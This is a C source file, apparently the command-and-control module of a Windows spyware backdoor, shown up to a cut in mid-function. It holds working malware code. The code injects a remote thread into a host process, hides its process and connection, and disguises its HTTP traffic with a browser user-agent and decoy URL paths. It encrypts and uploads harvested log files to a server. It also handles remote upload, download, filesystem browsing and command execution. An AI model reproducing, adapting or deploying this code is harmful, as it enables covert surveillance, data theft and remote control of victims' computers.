#include "common.h"
#include "H4-DLL.h" 
#include "ASP.h"
#include "AM_Core.h"
#include "UnHookClass.h"
#include <winhttp.h>
#include <stdio.h>
#include <shlwapi.h>
#include "sha1.h"
#include "aes_alg.h"
#include <string.h>
#include "x64.h"

#define ASP_SLEEP_TIME 20
#define ASP_START_TIMEOUT 60000 // un minuto di attesa per far inizializzare il processo host ASP
#define ASP_CONNECT_TIMEOUT 10000 // timeout prima di determinare che il server non e' raggiungibile
#define ASP_RESOLVE_TIMEOUT 10000
#define ASP_SEND_TIMEOUT 600000
#define ASP_RECV_TIMEOUT 600000

#define WIRESPEED (100*1024*1024/8)

HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/ricevere dati
BYTE asp_global_session_key[16];

extern char SHARE_MEMORY_ASP_COMMAND_NAME[MAX_RAND_NAME];

// --- Altri prototipi usati dal thread ASP ---
typedef void (__stdcall *ASP_MainLoop_t) (char *);
typedef void (__stdcall *ExitProcess_T) (UINT);
extern void HidePEB(HMODULE);

#define HOSTNAMELEN 256
typedef struct {
	HMCommonDataStruct pCommon;     // Necessario per usare HM_sCreateHookA. Definisce anche le funzioni come LoadLibrary
	char cDLLHookName[DLLNAMELEN];	// Nome della dll principale ("H4.DLL")
	char cASPServer[HOSTNAMELEN];   // server ASP
	char cASPMainLoop[64];          // Nome della funzione ASP
	ExitProcess_T pExitProcess;
} ASPThreadDataStruct;
ASPThreadDataStruct ASPThreadData;

// Struttura per il passaggio dei comandi ASP in shared memory
#define ASP_SETUP 0   // Setup (primo comando da inviare) 
#define ASP_AUTH  1   // Auth 
#define ASP_IDBCK 2   // ID
#define ASP_AVAIL 3   // Lista availables
#define ASP_NCONF 4   // Nuova configurazione
#define ASP_UPLO  5   // Prende un upload
#define ASP_DOWN  6   // Prende le richieste di download
#define ASP_FSYS  7   // Prende le richieste di filesystem browse
#define ASP_SLOG  8   // Invia un log al server
#define ASP_UPGR  9   // Prende un upgrade
#define ASP_BYE   10  // Chiude la sessione
#define ASP_SSTAT 11  // Invia info sui log che sta per spedire
#define ASP_PURGE 12  // Riceve i dati per il purge dei log
#define ASP_CMDE  13  // Prende le richieste di command execution

// XXXXX da definire....
#define MAX_ASP_IN_PARAM 1024
#define MAX_ASP_OUT_PARAM 1024*1024

#define ASP_NOP   0 // Nessuna operazione da eseguire
#define ASP_FETCH 1 // ASP host deve eseguire l'action
#define ASP_DONE  2 // ASP host ha finito con successo
#define ASP_ERROR 3 // ASP host ha finito con un errore
typedef struct {
	DWORD action;    // Azione da eseguire 
	DWORD status;    // stato dell'operazione (va settato per ultimo)
	DWORD out_command; // valore di ritorno del comando sul server
	BYTE in_param[MAX_ASP_IN_PARAM];
	DWORD in_param_len;
	BYTE out_param[MAX_ASP_OUT_PARAM];  // output del comando sul server
	DWORD out_param_len;
} ASP_IPCCommandDataStruct;

/*#define REQUEST_ARRAY_LEN 19
WCHAR *wRequest_array[] = {
		L"/pagead/show_ads.js",
		L"/licenses/by-nc-nd/2.5",
		L"/css-validator",
		L"/stats.asp?site=actual",
		L"/static/js/common/jquery.js",
		L"/cgi-bin/m?ci=ads&amp;cg=0",
		L"/rss/homepage.xml",
		L"/index.shtml?refresh",
		L"/static/css/common.css",
		L"/flash/swflash.cab#version=8,0,0,0",
		L"/js/swfobjectLivePlayer.js?v=10-57-13",
		L"/css/library/global.css",
		L"/rss/news.rss",
		L"/comments/new.js",
		L"/feed/view?id=1&type=channel",
		L"/ajax/MessageComposerEndpoint.php?__a=1",
		L"/safebrowsing/downloads?client=navclient",
		L"/extern_js/f/TgJFbiseMTg4LCsw2jgAQIACWFACU6rCA7RidA/qFso89FTd1c.js",
		L"/search.php"
	};*/


#define REQUEST_ARRAY_LEN 1
WCHAR *wRequest_array[] = {
		L"/index.jsp"
	};

HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
connection_hide_struct connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
HINTERNET hRequest = 0; // Handle usato dalle winhttp per inviare/ricevere dati
DWORD pub_key_size = 0; // Dimensione della chiave pubblica nel certificato server

///////////////////////////////////////////
// Funzioni per lanciare il thread ASP   //
///////////////////////////////////////////

// Thread remoto iniettato nel processo ASP host
DWORD ASP_HostThread(ASPThreadDataStruct *pDataThread)
{
	HMODULE hASPDLL;
	ASP_MainLoop_t pASP_MainLoop;
	INIT_WRAPPER(BYTE);

	hASPDLL = pDataThread->pCommon._LoadLibrary(pDataThread->cDLLHookName);
	if (!hASPDLL)
		pDataThread->pExitProcess(0);

	pASP_MainLoop = (ASP_MainLoop_t)pDataThread->pCommon._GetProcAddress(hASPDLL, pDataThread->cASPMainLoop);
	
	// Invoca il ciclo principale di ASP
	if (pASP_MainLoop)
		pASP_MainLoop(pDataThread->cASPServer);

	// Se il ciclo principale esce per qualche errore
	// il processo host viene chiuso
	pDataThread->pExitProcess(0);
	return 0;
}

// Lancia il thread di ASP nel processo dwPid
BOOL ASP_StartASPThread(DWORD dwPid)
{
	HANDLE hThreadRem;
	DWORD dwThreadId;

	if (!ASP_HostProcess)
		return FALSE;

	// Alloca dati e funzioni del thread ASP nel processo dwPid
	if(HM_sCreateHookA(dwPid, NULL, NULL, (BYTE *)ASP_HostThread, 600, (BYTE *)&ASPThreadData, sizeof(ASPThreadData)) == NULL)
		return FALSE;
	
	if ( !(hThreadRem = HM_SafeCreateRemoteThread(ASP_HostProcess, NULL, 8192, 
	  									   (LPTHREAD_START_ROUTINE)ASPThreadData.pCommon.dwHookAdd, 
									       (LPVOID)ASPThreadData.pCommon.dwDataAdd, 0, &dwThreadId)) )
		return FALSE;
		
	// Non e' necessario avere un handle aperto sul
	// thread di ASP
	CloseHandle(hThreadRem);

	return TRUE;
}

// Inizializza le strutture necessarie ad ASP
// Torna 0 se ha successo
DWORD ASP_Setup(char *asp_server)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(ASPThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
	VALIDPTR(ASPThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
	VALIDPTR(ASPThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));

	HM_CompletePath(H4DLLNAME, ASPThreadData.cDLLHookName);
	_snprintf_s(ASPThreadData.cASPServer, sizeof(ASPThreadData.cASPServer), _TRUNCATE, "%s", asp_server);
	_snprintf_s(ASPThreadData.cASPMainLoop, sizeof(ASPThreadData.cASPMainLoop), _TRUNCATE, "PPPFTBBP07");

	return 0;
}


////////////////////////////////////
// Funzioni IPC command per ASP   //
////////////////////////////////////
// Usata dall'host ASP per attaccarsi alla shared memory
BOOL ASP_IPCAttach()
{
	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_ASP_COMMAND_NAME);

	// Riutilizza ASP_IPC_command tanto non l'host ASP non lo condivide 
	// con il core
	if (h_file) 
		ASP_IPC_command = (ASP_IPCCommandDataStruct *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPCCommandDataStruct));

	if (ASP_IPC_command)
		return TRUE;

	return FALSE;
}


// Inizializza nel core la shared memory per ASP
BOOL ASP_IPCSetup()
{
	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPCCommandDataStruct), SHARE_MEMORY_ASP_COMMAND_NAME);
	if (hASPIPCcommandfile)
		ASP_IPC_command = (ASP_IPCCommandDataStruct *)FNC(MapViewOfFile)(hASPIPCcommandfile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPCCommandDataStruct));

	if (ASP_IPC_command) {
		memset(ASP_IPC_command, 0, sizeof(ASP_IPCCommandDataStruct));
		return TRUE;
	}

	return FALSE;
}

// Chiude nel core la shared memory per ASP
void ASP_IPCClose()
{
	if (ASP_IPC_command) {
		FNC(UnmapViewOfFile)(ASP_IPC_command);
		ASP_IPC_command = NULL;
	}

	SAFE_CLOSE_HANDLE(hASPIPCcommandfile);
}

/////////////////////////
// Funzioni accessorie //
/////////////////////////

// Parsa una risposta del server
// Ritorna un puntatore al body del messaggio
// Torna NULL in caso di fallimento
BYTE *ParseResponse(BYTE *ptr, DWORD len, DWORD *command, DWORD *message_len)
{
	BYTE *msg_ptr;
	BYTE iv[16];
	aes_context crypt_ctx;
	SHA1Context sha;
	DWORD i;

	// Check di consistenza del pacchetto
	if (len < sizeof(DWORD)*2)
		return NULL;

	// Decifra il pacchetto
	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
	memset(iv, 0, sizeof(iv));
	aes_cbc_decrypt(&crypt_ctx, iv, ptr, ptr, len);

	// Legge il comando di risposta
	msg_ptr = ptr;
	memcpy(command, msg_ptr, sizeof(DWORD));
	msg_ptr += sizeof(DWORD);
	SHA1Reset(&sha);

	if (*command == PROTO_OK) {
		// legge la lunghezza
		memcpy(message_len, msg_ptr, sizeof(DWORD));
		msg_ptr += sizeof(DWORD);

		// Check della lunghezza
		if (len <= sizeof(DWORD)*2 + *message_len + SHA_DIGEST_LENGTH)
			return NULL;

		// Calcola l'hash
		SHA1Input(&sha, (BYTE *)ptr, sizeof(DWORD)*2 + *message_len);
	} else if (*command == PROTO_NO) {
		// Check della lunghezza
		*message_len = 0;
		if (len <= sizeof(DWORD) + SHA_DIGEST_LENGTH)
			return NULL;

		// Calcola l'hash
		SHA1Input(&sha, (BYTE *)ptr, sizeof(DWORD));
	} else 
		return NULL;

	// Verifica lo sha1
	if (!SHA1Result(&sha)) 
		return NULL;
	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
	if (memcmp(msg_ptr + *message_len, sha.Message_Digest, SHA_DIGEST_LENGTH))
		return NULL;
	
	return msg_ptr;
}

// Prende un buffer e lo dumpa su file
BOOL WriteBufferOnFile(WCHAR *file_path, BYTE *buffer, DWORD buf_len)
{
	HANDLE hfile;
	DWORD n_read;

	if (buffer == NULL || file_path == NULL)
		return FALSE;

	hfile = CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		return FALSE;

	while (buf_len > 0) {
		if (!WriteFile(hfile, buffer, buf_len, &n_read, NULL) || n_read==0) {
			CloseHandle(hfile);
			return FALSE;
		}
		buffer += n_read;
		buf_len -= n_read;
	}
	CloseHandle(hfile);
	return TRUE;
}

// Genera una sequenza di byte a caso
void rand_bin_seq(BYTE *buffer, DWORD buflen)
{
	DWORD i;
	static BOOL first_time = TRUE;

	if (first_time) {
		srand(GetTickCount());
		first_time = FALSE;
	}

	for (i=0; i<buflen; i++)
		buffer[i] = rand();
}

// Invia il buffer rispettando il limite di banda di byte_per_second
BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
{
#define SAMPLING_RATE 100
	DWORD byte_per_sample = byte_per_second/SAMPLING_RATE;
	DWORD byte_sent = 0, byte_to_send;
	DWORD time_start, time_stop, time_expected;
	wchar_t  _wheaders[1024];

	// Verifica che non abbia usato un byte_per_second troppo basso
	if (byte_per_sample == 0)
		byte_per_sample = 1;
	if (byte_per_second == 0)
		byte_per_second = 1;

	// Inizia la richiesta
	swprintf_s(_wheaders, L"%ls %d", L"Content-Length:", len);
	if (!FNC(WinHttpAddRequestHeaders)(asp_global_request, _wheaders, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD))
		return FALSE;

	if (!FNC(WinHttpSendRequest)(asp_global_request, WINHTTP_NO_ADDITIONAL_HEADERS, -1L, WINHTTP_NO_REQUEST_DATA, 0, len, NULL))
		return FALSE;

	// Cicla finche' non spedisce tutti i byte
	while (byte_sent < len)	{
		// Vede se i byte ancora da mandare eccedono
		// quelli inviabili in un "sample" di tempo
		byte_to_send = len - byte_sent;
		if (byte_to_send > byte_per_sample)
			byte_to_send = byte_per_sample;

		time_start = FNC(GetTickCount)();
		// byte_to_send sono quelli da inviare in questo sample
		// (dopo la funzione sono quelli effettivamente inviati)
		if (!FNC(WinHttpWriteData)(asp_global_request, buf + byte_sent, byte_to_send, &byte_to_send))
			return FALSE;
		// Calcola quanti millisecondi avrebbe dovuto impiegare questa spedizione
		time_expected = (byte_to_send*1000) / byte_per_second;
		time_stop = FNC(GetTickCount)();
		// Se il tempo atteso e' maggiore di quello passato,
		// aspetta i millisecondi rimanenti
		// Se arriva al riavvolgimento (time_stop < time_start), l'expected
		// sara' sicuramente minore.
		if (time_expected > (time_stop - time_start))
			Sleep( time_expected - (time_stop - time_start));

		// Aggiorna i byte inviati
		byte_sent += byte_to_send;
	}

	return TRUE;
}

// Invia una richiesta HTTP e legge la risposta
// Alloca il buffer con la risposta (che va poi liberato dal chiamante)
BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, DWORD byte_per_second)
{
	WCHAR szContentLength[32];
	DWORD cch = sizeof(szContentLength);
	DWORD dwHeaderIndex = WINHTTP_NO_HEADER_INDEX;
	DWORD dwContentLength;
	DWORD n_read;
	BYTE *ptr;

	// Invia la richiesta
	if (!BandSafeDataSend(s_buffer, sbuf_len, byte_per_second))
		return FALSE;

	// Legge la risposta
	if(!FNC(WinHttpReceiveResponse)(asp_global_request, 0)) 
		return FALSE;

	if (!WinHttpQueryHeaders(asp_global_request, WINHTTP_QUERY_CONTENT_LENGTH, NULL, &szContentLength, &cch, &dwHeaderIndex))
		return FALSE;
	dwContentLength = _wtoi(szContentLength);
	if (dwContentLength == 0)
		return FALSE;

	*r_buffer = (BYTE *)malloc(dwContentLength);
	if (! (*r_buffer))
		return FALSE;

	ptr = *r_buffer;
	*response_len = 0;
	do {
		if(!FNC(WinHttpReadData)(asp_global_request, ptr, dwContentLength, &n_read)) {
			SAFE_FREE(*r_buffer);
			return FALSE;	
		}

		*response_len += n_read;
		dwContentLength -= n_read;
		ptr += n_read;

	} while(n_read>0 && dwContentLength>0);

	// Arrotonda per eliminare i byte aggiunti per padding random
	*response_len -= ((*response_len)%16);
	return TRUE;
}

// Crea il buffer da inviare per un comando piu' messaggio
// il buffer ritornato va liberato
BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
{
	SHA1Context sha;
	DWORD tot_len, pad_len, i;
	BYTE *buffer, *ptr;
	aes_context crypt_ctx;
	DWORD rand_pad_len = 0;
	BYTE iv[16];

	if (ret_len)
		*ret_len = 0;

	rand_pad_len = (rand()%15)+1;

	// arrotonda 
	pad_len = tot_len = sizeof(DWORD) + msg_len + SHA_DIGEST_LENGTH;
	tot_len/=16;
	tot_len++;
	tot_len*=16;
	pad_len = tot_len - pad_len;

	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len)))
		return NULL;

	SHA1Reset(&sha);
	SHA1Input(&sha, (BYTE *)&command, sizeof(DWORD));
	if (msg_len)
		SHA1Input(&sha, (BYTE *)message, msg_len);
	if (!SHA1Result(&sha)) {
		free(buffer);
		return NULL;
	}
	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);

	// scrive il buffer
	memset(buffer, pad_len, tot_len);
	ptr = buffer;
	memcpy(ptr, &command, sizeof(DWORD));
	ptr += sizeof(DWORD);
	if (msg_len)
		memcpy(ptr, message, msg_len);
	ptr += msg_len;
	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));

	// cifra il tutto
	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
	memset(iv, 0, sizeof(iv));
	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
	rand_bin_seq(buffer + tot_len, rand_pad_len);

	if (ret_len)
		*ret_len = tot_len + rand_pad_len;
	return buffer;
}

// Formatta il buffer per l'invio di un log
// Non usa PrepareCommand per evitare di dover allocare due volte la dimensione del file
BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
{
	SHA1Context sha;
	DWORD tot_len, pad_len, i;
	BYTE *buffer, *ptr;
	aes_context crypt_ctx;
	DWORD msg_len, bytes_left;
	BYTE iv[16];
	DWORD command = PROTO_LOG;
	HANDLE hfile;
	DWORD n_read;
	DWORD rand_pad_len = 0;

	if (ret_len)
		*ret_len = 0;

	rand_pad_len = (rand()%15)+1;

	// Legge la lunghezza del body del file
	hfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	msg_len = GetFileSize(hfile, NULL);
	if (msg_len == INVALID_FILE_SIZE) {
		CloseHandle(hfile);
		return NULL;
	}

	// arrotonda 
	pad_len = tot_len = sizeof(DWORD)*2 + msg_len + SHA_DIGEST_LENGTH;
	tot_len/=16;
	tot_len++;
	tot_len*=16;
	pad_len = tot_len - pad_len;

	// alloca il buffer
	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len))) {
		CloseHandle(hfile);
		return NULL;
	}

	// scrive il buffer
	memset(buffer, pad_len, tot_len);
	ptr = buffer;
	memcpy(ptr, &command, sizeof(DWORD));
	ptr += sizeof(DWORD);
	memcpy(ptr, &msg_len, sizeof(DWORD));
	ptr += sizeof(DWORD);

	// copia il contenuto del file
	bytes_left = msg_len;
	while (bytes_left > 0) {
		if (!ReadFile(hfile, ptr, bytes_left, &n_read, NULL) || n_read==0) {
			CloseHandle(hfile);
			return NULL;
		}
		ptr += n_read;
		bytes_left -= n_read;
	}
	CloseHandle(hfile);

	// Calcola lo sha1 sulla prima parte del buffer
	SHA1Reset(&sha);
	SHA1Input(&sha, buffer, sizeof(DWORD)*2 + msg_len);
	if (!SHA1Result(&sha)) {
		free(buffer);
		return NULL;
	}
	// ..lo scrive
	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));

	// cifra il tutto
	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
	memset(iv, 0, sizeof(iv));
	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
	rand_bin_seq(buffer + tot_len, rand_pad_len);

	if (ret_len)
		*ret_len = tot_len + rand_pad_len;
	return buffer;
}

// Ritorna la stringa pascalizzata
// il buffer ritornato va liberato
BYTE *PascalizeString(WCHAR *string, DWORD *retlen)
{
	DWORD len;
	BYTE *buffer;

	len = (wcslen(string)+1)*sizeof(WCHAR);
	buffer = (BYTE *)malloc(len+sizeof(DWORD));
	if (!buffer)
		return NULL;
	ZeroMemory(buffer, len+sizeof(DWORD));
	memcpy(buffer, &len, sizeof(DWORD));
	wcscpy_s((WCHAR *)(buffer+sizeof(DWORD)), len/sizeof(WCHAR), string); 

	*retlen = len+sizeof(DWORD);
	return buffer;
}

// De-pascalizza la stringa (alloca la stringa)
WCHAR *UnPascalizeString(BYTE *data, DWORD *retlen)
{	
	*retlen = *((DWORD *)data);
	data += sizeof(DWORD);

	return wcsdup((WCHAR *)data);
}

// Risolve server_url
BOOL H_ASP_ResolveName(char *server_url, char *addr_to_connect, DWORD buflen)
{
	struct hostent *hAddress;
	char *addr_ptr;
	WORD wVersionRequested;
	WSADATA wsaData;

	// E' gia' un indirizzo IP
	if (inet_addr(server_url) != INADDR_NONE) {
		_snprintf_s(addr_to_connect, buflen, _TRUNCATE, "%s", server_url);
		return TRUE;
	}

	wVersionRequested = MAKEWORD( 2, 2 );
	if ( WSAStartup( wVersionRequested, &wsaData )!= 0 )
		return FALSE;
	hAddress = gethostbyname(server_url);
	WSACleanup();

	if (!hAddress || !(addr_ptr = inet_ntoa(*(struct in_addr*)hAddress->h_addr)))
		return FALSE;

	_snprintf_s(addr_to_connect, buflen, _TRUNCATE, "%s", addr_ptr);
	return TRUE;
}

// XXX Mancano tutte le GlobalFree per le strutture WinHTTP
// ma tanto la funzione viene richiamata una volta sola dal 
// processo e poi muore
BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, DWORD *port_to_connect)
{
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig;
	WINHTTP_PROXY_INFO ProxyInfoTemp, ProxyInfo;
	WINHTTP_AUTOPROXY_OPTIONS OptPAC;
	DWORD dwOptions = 0;
	WCHAR _wHostProto[256]; 	
	WCHAR _wHost[256]; 	
	HINTERNET hSession = 0, hConnect = 0;
	char *addr_ptr;
	char *types[] = { "*\x0/\x0*\x0",0 };
	BOOL isProxy = FALSE;

	swprintf_s(_wHost, L"%S", server_url);
	swprintf_s(_wHostProto, L"http://%S", server_url);
	ZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));

	// Crea una sessione per winhttp.
    hSession = FNC(WinHttpOpen)( L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);

	// Cerca nel registry le configurazioni del proxy
	if (hSession && FNC(WinHttpGetIEProxyConfigForCurrentUser)(&ProxyConfig)) {
		// I metodi di configurazione sono nell'ordine inverso
		// rispetto a come li considera internet explorer
		// In questo modo l'ultimo che riesce a trovare un proxy 
		// verra' utilizzato.
		if (ProxyConfig.lpszProxy) {
			// Proxy specificato
			ProxyInfo.lpszProxy = ProxyConfig.lpszProxy;
			ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			ProxyInfo.lpszProxyBypass = NULL;
		}

		if (ProxyConfig.lpszAutoConfigUrl) {
			// Script proxy pac
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
			OptPAC.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
			OptPAC.dwAutoDetectFlags = 0;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (FNC(WinHttpGetProxyForUrl)(hSession ,_wHostProto, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		if (ProxyConfig.fAutoDetect) {
			// Autodetect proxy
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
			OptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpszAutoConfigUrl = NULL;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (FNC(WinHttpGetProxyForUrl)(hSession ,_wHostProto, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		// Se ha trovato un valore sensato per il proxy, allora ritorna
		if (ProxyInfo.lpszProxy) {
			
			isProxy = TRUE;
			FNC(WinHttpSetOption)(hSession, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo));
	
			// Parsa la stringa per separare la porta
			_snprintf_s(addr_to_connect, buflen, _TRUNCATE, "%S", ProxyInfo.lpszProxy);
			if (addr_ptr = strchr(addr_to_connect, (int)':')) {
				*addr_ptr = 0;
				addr_ptr++;
				sscanf_s(addr_ptr, "%d", port_to_connect);
			} else
				*port_to_connect = 8080;

			if (!H_ASP_ResolveName(addr_to_connect, addr_to_connect, buflen))
				return FALSE;
		}
	}

	// Se ci connettiamo senza proxy
	if (!isProxy) {
		*port_to_connect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80
		if (!H_ASP_ResolveName(server_url, addr_to_connect, buflen))
			return FALSE;
		swprintf_s(_wHost, L"%S", addr_to_connect); // In questo caso mette nella richiesta winhttp direttamente l'indirizzo IP
	}

	// Definisce il target
	if ( !(hConnect = FNC(WinHttpConnect)( hSession, (LPCWSTR) _wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
		return FALSE;
	
	// Crea la richiesta
	if ( !(asp_global_request = FNC(WinHttpOpenRequest)( hConnect, L"POST", wRequest_array[rand()%REQUEST_ARRAY_LEN], NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, 0)) )
		return FALSE;

	FNC(WinHttpSetTimeouts)(asp_global_request, ASP_RESOLVE_TIMEOUT, ASP_CONNECT_TIMEOUT, ASP_SEND_TIMEOUT, ASP_RECV_TIMEOUT);
	return TRUE;
}


//////////////////////////////////////////////
// Funzioni che eseguono i comandi del core //
//////////////////////////////////////////////

#define AUTH_REAL_LEN 112
// Esegue il passi di AUTH
BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len, char *instance, DWORD inst_len, char *subtype, DWORD sub_len, char *conf_key, DWORD ckey_len, DWORD *response_command)
{
	BYTE buffer[AUTH_REAL_LEN+16];
	BYTE *response;
	BYTE *ptr;
	BYTE client_key[16];
	BYTE server_key[16];
	BYTE nonce_payload[16];
	BYTE sha1buf[256];
	SHA1Context sha;
	DWORD response_len;
	DWORD i;
	BYTE iv[16];
	aes_context crypt_ctx;
	DWORD rand_pad_len = 0;

	*response_command = PROTO_NO;

	// Costruisce il buffer
	ZeroMemory(buffer, sizeof(buffer));
	rand_bin_seq(client_key, 16);
	rand_bin_seq(nonce_payload, 16);
	
	SHA1Reset(&sha);
	ZeroMemory(sha1buf, sizeof(sha1buf));
	memcpy(sha1buf, backdoor_id, bid_len);
	SHA1Input(&sha, sha1buf, 16);

	ZeroMemory(sha1buf, sizeof(sha1buf));
	memcpy(sha1buf, instance, inst_len);
	SHA1Input(&sha, sha1buf, 20);

	ZeroMemory(sha1buf, sizeof(sha1buf));
	memcpy(sha1buf, subtype, sub_len);
	SHA1Input(&sha, sha1buf, 16);

	ZeroMemory(sha1buf, sizeof(sha1buf));
	memcpy(sha1buf, conf_key, ckey_len);
	SHA1Input(&sha, sha1buf, 16);
	if (!SHA1Result(&sha)) 
		return FALSE;

	ptr = buffer;
	memcpy(ptr, client_key, 16); 
	ptr+=16;
	memcpy(ptr, nonce_payload, 16); 
	ptr+=16;
	memcpy(ptr, backdoor_id, bid_len); 
	ptr+=16;
	memcpy(ptr, instance, inst_len);
	ptr+=20;
	memcpy(ptr, subtype, sub_len); 
	ptr+=16;

	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));
	ptr+=SHA_DIGEST_LENGTH;
	memset(ptr, 8, AUTH_REAL_LEN-(ptr-buffer)); // Padda fino alla fine con 8

	// Cifra il buffer
	aes_set_key( &crypt_ctx, (BYTE *)signature, 128);
	memset(iv, 0, sizeof(iv));
	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, AUTH_REAL_LEN);
	rand_pad_len = (rand()%15)+1;
	rand_bin_seq(buffer+AUTH_REAL_LEN, rand_pad_len);

	// Invia la richiesta
	if (!HttpTransaction(buffer, AUTH_REAL_LEN + rand_pad_len, &response, &response_len, WIRESPEED))
		return FALSE;

	// Parsa la prima parte della reply
	if (response_len != 64) {
		SAFE_FREE(response);
		return FALSE;
	}
	aes_set_key( &crypt_ctx, (BYTE *)signature, 128);
	memset(iv, 0, sizeof(iv));
	aes_cbc_decrypt(&crypt_ctx, iv, response, response, 32);
	if (response[16]!=16) {
		SAFE_FREE(response);
		return FALSE;
	}
	memcpy(server_key, response, sizeof(server_key));
	SHA1Reset(&sha);
	SHA1Input(&sha, (BYTE *)conf_key, 16);
	SHA1Input(&sha, (BYTE *)server_key, 16);
	SHA1Input(&sha, (BYTE *)client_key, 16);
	if (!SHA1Result(&sha)) {
		SAFE_FREE(response);
		return FALSE;
	}
	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
	memcpy(asp_global_session_key, sha.Message_Digest, 16);

	// Parsa la seconda parte della reply
	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
	memset(iv, 0, sizeof(iv));
	ptr = response + 32;
	aes_cbc_decrypt(&crypt_ctx, iv, ptr, ptr, 32);
	if (memcmp(ptr, nonce_payload, 16)) {
		SAFE_FREE(response);
		return FALSE;
	}
	ptr+=16;
	*response_command = *((DWORD *)ptr);
	SAFE_FREE(response);
	return TRUE;
}

// Fa il passo ID
// Ritorna il response message (che va poi liberato) di dimensione response_message_len
BYTE *H_ASP_ID(WCHAR *user_id, WCHAR *device_id, WCHAR *source_id, DWORD *response_message_len)
{
	BYTE *response = NULL;
	BYTE *message = NULL, *ptr = NULL;
	BYTE *p_usr = NULL, *p_dev = NULL, *p_src = NULL;
	DWORD l_usr, l_dev, l_src;
	DWORD buffer_len;
	DWORD response_len;
	BYTE *buffer = NULL;
	DWORD response_command;
	BYTE *response_message = NULL;
	DWORD version = atoi(CLIENT_VERSION);

	p_usr = PascalizeString(user_id, &l_usr);
	p_dev = PascalizeString(device_id, &l_dev);
	p_src = PascalizeString(source_id, &l_src);

	do {
		if (!p_usr || !p_dev || !p_src) 
			break;

		// Costruisce il messaggio
